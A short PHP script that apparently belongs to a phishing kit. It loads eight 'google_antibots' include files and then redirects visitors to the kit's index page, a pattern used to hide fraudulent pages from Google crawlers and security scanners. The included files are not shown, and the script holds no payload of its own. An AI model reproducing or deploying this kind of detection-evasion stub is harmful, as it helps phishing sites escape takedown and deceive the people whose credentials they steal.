<?php
  	require '../google_antibots/anti1.php';
	require '../google_antibots/anti2.php';
	require '../google_antibots/anti3.php';
	require '../google_antibots/anti4.php';
	require '../google_antibots/anti5.php';
	require '../google_antibots/anti6.php';
	require '../google_antibots/anti7.php';
	require '../google_antibots/anti8.php';
	exit(header("Location: ../index.php"));
?>
